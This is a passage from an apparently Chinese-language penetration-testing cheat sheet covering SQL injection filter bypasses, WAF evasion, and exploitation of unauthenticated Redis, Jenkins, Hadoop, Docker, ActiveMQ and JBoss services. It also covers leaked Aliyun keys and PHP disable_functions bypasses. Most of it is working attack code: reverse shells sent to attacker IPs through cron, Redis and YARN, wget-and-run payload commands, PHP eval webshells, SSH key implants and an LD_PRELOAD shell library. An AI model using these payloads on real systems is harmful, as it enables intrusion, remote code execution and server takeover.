换行符，可结合注释符使用%23%0a，%2d%2d%0a。%21  ！ 叹号%2b  +  加号%2d  -  减号%40  @  符号%7e   ~  波浪号Id=1 union select(1),user()Id=1 union /!12345select/1,user()Id=1 union select@1,user()Id=1 union select &#123;x 1&#125;,user()Id=1 union select&quot;1&quot;,user()Id=1 union select\N,user()Id=1 union select 1,user()`Id=1 union select 1,user()&quot;&quot;Id=1 union select 1,user()AId=1 union select 1,user()`bId=1 union(select 1,(select/!schema_name/from information_schema.SCHEMATA limit 1,1))Id=1 union(select 1,(select&#123;x schema_name&#125;from information_schema.SCHEMATA limit 1,1))Id=1 union(select 1,(select(schema_name)from information_schema.SCHEMATA limit 1,1))浮点数Id= 1.0union select 1,user()Id= 1.union select 1,user()Id= 1E0union select 1,user()Id=\Nunion select 1,user()Id=1 unionselect user(),2.0from adminId=1 union select user(),8e0from adminId=1 union select user(),\Nfrom admin内联注释/*!UnIon12345SelEcT*/ 1,user()   //数字范围 1000-50540mysql黑魔法select&#123;x username&#125;from &#123;x11 test.admin&#125;;函数截取Mid(version(),1,1)Substr(version(),1,1)Substring(version(),1,1)Lpad(version(),1,1)Rpad(version(),1,1)Left(version(),1)reverse(right(reverse(version()),1)) 连接concat(version(),&#39;|&#39;,user());concat_ws(&#39;|&#39;,1,2,3)字符转换Ascii() Char() Hex() Unhex()过滤逗号127&#39; UNION SELECT * FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# 相当于 union select 1,2,3,4,5union select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)blimit 1 offset 0相当于limit 1,0mid(version() from 1 for 1)相当于Mid(version(),1,1)&lt;&gt;被过滤id=1 and ascii(substr(database(),0,1))&gt;64比较符greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值id=1 and greatest(ascii(substr(database(),0,1)),64)=64函数构造sleep(5)/benchmark(10000000,SHA1(1))id=1 xor sleep%23%0a(5)id=1 xor sleep%2d%2d%0a(5)id=1 xor sleep([%20]5) id=1 xor benchmark%0a(10000000,SHA1(1))id=1 xor sleep[空白字符](5)select&#123;x[可填充字符]1&#125;</code></pre><h6 id="MSSQL-1"><a href="#MSSQL-1" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>注释符/*、--、;00%、/**/空格符[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]特殊符号%3a 冒号id=1 union:select 1,2 from:adminid=1 union select+1,&#39;2&#39;,db_name() from adminid=1 union select-1,&#39;2&#39;,db_name() from adminid=1 union select.1,&#39;2&#39;,db_name() from adminid=1 union select:1,&#39;2&#39;,db_name() from adminid=1 union select~1,&#39;2&#39;,db_name() from adminid=1%20union%20select%201,&#39;2&#39;,db_name()%80from%20adminid=1 union select 1,&#39;2&#39;,db_name+() from admin函数变形: db_name[空白字符]()浮点数id=1.1union select 1,&#39;2&#39;,db_name()id=1e0union select 1,&#39;2&#39;,db_name()运算符id=1-1union select &#39;1&#39;,system_user,3 from adminid=1e-union select &#39;1&#39;,system_user,3 from admin字符串截取函数Substring(@@version,1,1)Left(@@version,1)Right(@@version,1)charindex(&#39;test&#39;,db_name())字符串转换函数Ascii(&#39;a&#39;)=char(97) 括号之间可添加空格</code></pre><h5 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h5><pre><code>同时提交GET和POST访问HTTP绕过对HTTPS的防护%00截断参数填充垃圾数据，缓冲区溢出X-FORWARDED-FOR伪造绕过静态文件/sql.php/1.js?id=1绕过白名单绕过，URL只要存在某字符就不会拦截/sql.php/admin.php?id=1/sql.php?a=/manage/&amp;b=../etc/passwd/../../../manage/../sql.asp?id=2伪造User-agent绕过，可改为爬虫agent</code></pre><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h5 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h5><h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><pre><code>&gt;redis-cli -h 127.0.0.1 flunshall 192.168.0.110:6379&gt;pingPONG 存在未授权访问</code></pre><h6 id="JS打内网"><a href="#JS打内网" class="headerlink" title="JS打内网"></a>JS打内网</h6><pre><code>var cmd = new XMLHttpRequest();      cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      cmd.send(&#39;flushall\r\n&#39;);             var cmd =new XMLHttpRequest();      cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      cmd.send(&#39;eval \&#39;&#39; + &#39;redis.call(\&quot;set\&quot;,\&quot;1\&quot;,\&quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp;/dev/tcp/外网IP/5566 0&gt;&amp;1\\n\\n&quot;);redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dir\&quot;,\&quot;/var/spool/cron/\&quot;); redis.call(\&quot;config\&quot;,\&quot;set\&quot;, \&quot;dbfilename\&quot;, \&quot;root\&quot;);&#39; + &#39;\&#39; 0&#39; +&quot;\r\n&quot;);       var cmd =new XMLHttpRequest();      cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);       cmd.send(&#39;save\r\n&#39;);</code></pre><h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><pre><code>保存为shecho -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12138 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -p $2 -x set 1echo -e &quot;\n\n */1 * * * * python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.108&quot;,12138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit执行&gt;bash 1.sh 192.168.0.120 6379</code></pre><p><img src="./img/34.png" alt="image"><br><img src="./img/35.png" alt="image"></p><h6 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h6><pre><code>6379&gt; config set dir /var/www/html/6379&gt; config set dbfilename shell.php6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;6379&gt; save</code></pre><h6 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h6><pre><code>ssh-keygen本地生成一对密钥https://github.com/JoyChou93/hackredis&gt;ssh-keygen -t rsa -C &quot;xx@xx.com&quot;&gt;(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; qq.txt&gt;redis-cli -h 127.0.0.1 flunshall&gt;cat qq.txt | redis-cli -h 127.0.0.1 -x set crackit&gt;redis-cli -h 127.0.0.16379&gt; config set dir /root/.ssh/6379&gt; config set dbfilename &quot;authorized_keys&quot;6379&gt; save本地登录#ssh -i id_rsa root@11.11.11.11</code></pre><h6 id="redis-rogue-getshell"><a href="#redis-rogue-getshell" class="headerlink" title="redis-rogue-getshell"></a>redis-rogue-getshell</h6><pre><code>https://github.com/vulhub/redis-rogue-getshell需要python3.0以上编译&gt;cd RedisModulesSDK/&gt;make会在此目录下生成exp.so执行命令&gt;python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c &quot;cat /etc/passwd&quot;</code></pre><p><img src="./img/36.png" alt="image"></p><h6 id="redis-rogue-server"><a href="#redis-rogue-server" class="headerlink" title="redis-rogue-server"></a>redis-rogue-server</h6><pre><code>https://github.com/n0b0dyCN/redis-rogue-server需要python3.6以上编译&gt;cd RedisModulesSDK/exp&gt;make执行&gt;./redis-rogue-server.py --rhost 192.168.0.120 --lhost 192.168.0.108</code></pre><p><img src="./img/37.png" alt="image"><br><img src="./img/38.png" alt="image"></p><pre><code>也可以反向shell</code></pre><p><img src="./img/39.png" alt="image"><br><img src="./img/40.png" alt="image"></p><h6 id="redis在windows下的利用"><a href="#redis在windows下的利用" class="headerlink" title="redis在windows下的利用"></a>redis在windows下的利用</h6><pre><code>Web目录写入木马启动项系统DLL劫持(目标重启或注销)特定软件的DLL劫持覆盖快捷方式覆盖配置文件覆盖sethc等文件https://github.com/r35tart/RedisWriteFile&gt;python3 rediswritefile.py --rhost=目标IP --rport=6379 --lhost=本机IP --lport=本地端口 --rpath=&quot;在目标保存的路径&quot; --rfile=&quot;在目标保存的文件&quot; --lfile=&quot;本地文件&quot; --auth=redis密码</code></pre><h6 id="Lua-RCE"><a href="#Lua-RCE" class="headerlink" title="Lua RCE"></a>Lua RCE</h6><pre><code>https://github.com/QAX-A-Team/redis_lua_exploit修改redis_lua.py里的 host 为目标 IP执行返回正常，反弹shell&gt;eval &quot;tonumber(&#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12345 0&gt;&amp;1&#39;, 8)&quot; 0</code></pre><h5 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title="Jenkins未授权访问"></a>Jenkins未授权访问</h5><pre><code>http://www.qq.com:8080/managehttp://www.qq.com:8080/script执行命令&gt;println &quot;ifconfig -a&quot;.execute().text反弹shell&gt;println &quot;wget http://your.com/back.py -P /tmp/&quot;.execute().text&gt;println &quot;python /tmp/back.py yourIP 8080&quot;.execute().text写shell&gt;println &quot;wget http://your.com/t.txt -o /var/www/html/1.php&quot;.execute().text&gt;new File(&quot;/var/www/html/1.php&quot;).write(&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;);&gt;def webshell = &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;&gt;new File(&quot;/var/www/html/1.php&quot;).write(&quot;$webshell&quot;);</code></pre><h5 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h5><pre><code>默认端口27017直接连接进行增删改查连接工具https://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe</code></pre><h5 id="ZooKeeper未授权访问"><a href="#ZooKeeper未授权访问" class="headerlink" title="ZooKeeper未授权访问"></a>ZooKeeper未授权访问</h5><pre><code>默认端口2181获得服务器环境信息&gt;echo envi|nc 192.168.0.1 2181连接&gt;./zkCli.sh -server ip:port连接工具https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</code></pre><h5 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h5><pre><code>默认端口9200http://1.1.1.1:9200/_plugin/head/http://1.1.1.1:9200/_nodeshttp://1.1.1.1:9200/_riverhttp://1.1.1.1:9200/_plugin/sql/</code></pre><h5 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title="Memcache未授权访问"></a>Memcache未授权访问</h5><pre><code>默认端口11211&gt;telnet 1.1.1.1 11211&gt;nc -vv 1.1.1.1 11211</code></pre><h5 id="Hadoop未授权访问"><a href="#Hadoop未授权访问" class="headerlink" title="Hadoop未授权访问"></a>Hadoop未授权访问</h5><pre><code>http://192.168.1.1:8088/cluster本地监听端口 &gt;&gt; 创建Application &gt;&gt; 调用Submit Application API提交</code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> requeststarget <span class="token operator">=</span> <span class="token string">'http://192.168.18.129:8088/'</span>lhost <span class="token operator">=</span> <span class="token string">'192.168.18.138'</span> <span class="token comment"># put your local host ip here, and listen at port 9999</span>url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">'ws/v1/cluster/apps/new-application'</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">)</span>app_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'application-id'</span><span class="token punctuation">]</span>url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">'ws/v1/cluster/apps'</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'application-id'</span><span class="token punctuation">:</span> app_id<span class="token punctuation">,</span>    <span class="token string">'application-name'</span><span class="token punctuation">:</span> <span class="token string">'get-shell'</span><span class="token punctuation">,</span>    <span class="token string">'am-container-spec'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'commands'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">'command'</span><span class="token punctuation">:</span> <span class="token string">'/bin/bash -i >&amp; /dev/tcp/%s/9999 0>&amp;1'</span> <span class="token operator">%</span> lhost<span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">'application-type'</span><span class="token punctuation">:</span> <span class="token string">'YARN'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a>Docker未授权访问</h5><pre><code>默认端口2375&gt;docker -H tcp://1.1.1.1:2375 images本地监听启动容器docker -H tcp://1.1.1.1:2375 run -id -v /etc/crontabs:/tmp alpine:latestdocker -H tcp://1.1.1.1:2375 ps进入容器docker -H tcp://1.1.1.1:2375 exec -it a8ff7ed880fb shecho &#39;* * * * * /usr/bin/nc &#123;vps_ip&#125; 9999 -e /bin/sh&#39; &gt;&gt; /tmp/root #添加计划任务cat /tmp/root exitShipyard默认密码admin/shipyard</code></pre><h5 id="ActiveMQ未授权访问"><a href="#ActiveMQ未授权访问" class="headerlink" title="ActiveMQ未授权访问"></a>ActiveMQ未授权访问</h5><pre><code>默认端口8161http://1.1.1.1:8161/admin/connections.jspPUT /fileserver/%2F%2F2%083.jsp HTTP/1.0Content-Length: 27Host: 1.1.1.1:8161Connection: CloseAuthorization: Basic YWRtaW46YWRtaW4=123123123123123123123123123</code></pre><h5 id="JBOSS未授权访问"><a href="#JBOSS未授权访问" class="headerlink" title="JBOSS未授权访问"></a>JBOSS未授权访问</h5><pre><code>http://192.168.1.1:8080/jmx-console/ 无需认证进入jboss.deployment部署shelladdURL()的paramValue写入远程war木马地址</code></pre><h4 id="阿里云OSS-Key利用"><a href="#阿里云OSS-Key利用" class="headerlink" title="阿里云OSS Key利用"></a>阿里云OSS Key利用</h4><pre><code>反编译app文件，查找可能会包含oss key的文件，如JS。OSSAccessKey、AccessKeySecret使用OSS浏览器访问。第三方行云管家可修改系统密码。反弹shellFrom: https://xz.aliyun.com/t/8310https://api.aliyun.com/#/?product=Ecs搜索框搜索选择CreateCommand来创建一个命令CommandContent填命令的base64，Type填RunShellScript命令echo &quot;bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1&quot;| base64bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMCZndDsmMQ==</code></pre><p><img src="./img/841.png" alt="image"></p><pre><code>填好以后点调试SDK会直接给你起一个Cloud shell</code></pre><p><img src="./img/842.png" alt="image"></p><pre><code>并创建一个CreateCommand.py文件，使用vi编辑</code></pre><p><img src="./img/843.png" alt="image"></p><pre><code>填accessKeyId,accessSecret保存执行，并记录Commandid</code></pre><p><img src="./img/844.png" alt="image"></p><pre><code>再次在搜索框搜索InvokeCommand</code></pre><p><img src="./img/845.png" alt="image"></p><pre><code>Commandid填上面请求的返回值，InstanceId填行云管家显示的实例ID</code></pre><p><img src="./img/846.png" alt="image"></p><pre><code>填好了点调试sdk然后编辑文件把accessKeyId accessSecret填一下，执行</code></pre><p><img src="./img/847.png" alt="image"></p><pre><code>然后看监听的服务器shell已经反弹成功</code></pre><p><img src="./img/848.png" alt="image"></p><h4 id="Linux绕过disable-function"><a href="#Linux绕过disable-function" class="headerlink" title="Linux绕过disable_function"></a>Linux绕过disable_function</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><pre><code>linux环境putenv()、mail()可用https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOADhttp://192.168.0.107/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.sooutpath是命令输出位置，sopath指定so文件路径。或替换php文件中的mail为error_log(&quot;a&quot;,1);</code></pre><h5 id="php7-0-7-3-bypass"><a href="#php7-0-7-3-bypass" class="headerlink" title="php7.0-7.3 bypass"></a>php7.0-7.3 bypass</h5><pre><code>直接bypasshttps://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php</code></pre><h5 id="windows系统组件com绕过"><a href="#windows系统组件com绕过" class="headerlink" title="windows系统组件com绕过"></a>windows系统组件com绕过</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$wsh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 生成一个COM对象　Shell.Application也能</span><span class="token variable">$exec</span> <span class="token operator">=</span> <span class="token variable">$wsh</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmd /c"</span><span class="token operator">.</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//调用对象方法来执行命令</span><span class="token variable">$stdout</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stroutput</span> <span class="token operator">=</span> <span class="token variable">$stdout</span><span class="token operator">-></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$stroutput</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="CGI启动方式"><a href="#CGI启动方式" class="headerlink" title="CGI启动方式"></a>CGI启动方式</h5><pre><code>phpinfo中搜索server api是cgi或者fastcgi如果是cgi模式:上传如下htaccessOptions ExecCGIAddHandler cgi-script .xxwindows平台#!C:/Windows/System32/cmd.exe /c start calc.exe1linux平台#!/bin/bashecho -ne &quot;Content-Type: text:html\n\n&quot;whoami如果是fast_cgi，上传如下htaccessOptions +ExecCGIAddHandler fcgid-script .abcFcgidWrapper &quot;C:/Windows/System32/cmd.exe /c start cmd.exe&quot; .abc上传任意文件.abc相对路径AddHandler fcgid-script .htmlFcgidWrapper &quot;../../php/php7.3.4nts/php-cgi.exe&quot; .htmlAddHandler fcgid-script .xxFcgidWrapper &quot;../../../WWW/localhost/calc.exe&quot; .xx</code></pre><h5 id="ImageMagick组件绕过"><a href="#ImageMagick组件绕过" class="headerlink" title="ImageMagick组件绕过"></a>ImageMagick组件绕过</h5><pre><code>imageMagick 版本 v6.9.3-9 或 v7.0.1-0第一种</code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Disable Functions: "</span> <span class="token operator">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token constant">PHP_SAPI</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'cli'</span> <span class="token operator">?</span> <span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$exploit</span> <span class="token operator">=</span> <span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>EOF</span>push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|<span class="token interpolation"><span class="token variable">$command</span></span>")'    //核心pop graphic-context<span class="token delimiter symbol">EOF<span class="token punctuation">;</span></span></span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KKKK.mvg"</span><span class="token punctuation">,</span> <span class="token variable">$exploit</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-></span><span class="token function">readImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'KKKK.mvg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-></span><span class="token function">writeImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'KKKK.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-></span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-></span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KKKK.mvg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KKKK.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>第二种</code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmd <span class="token operator">=</span> <span class="token string">"nc -e /usr/bin/zsh 127.0.0.1 4444"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">fileno</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>编译gcc -shared -fPIC imag.c -o imag.so</code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'LD_PRELOAD=/var/www/html/imag.so'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp/1.ps'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="常规函数绕过"><a href="#常规函数绕过" class="headerlink" title="常规函数绕过"></a>常规函数绕过</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>------------------------------------------------------<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>------------------------------------------------------<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>------------------------------------------------------<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>------------------------------------------------------<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$command</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//fread($handle, 1024);</span><span class="token punctuation">&#125;</span><span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>-------------------------------------------------------<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$command</span><span class="token operator">=</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">;</span><span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token punctuation">,</span><span class="token variable">$descriptorspec</span> <span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token 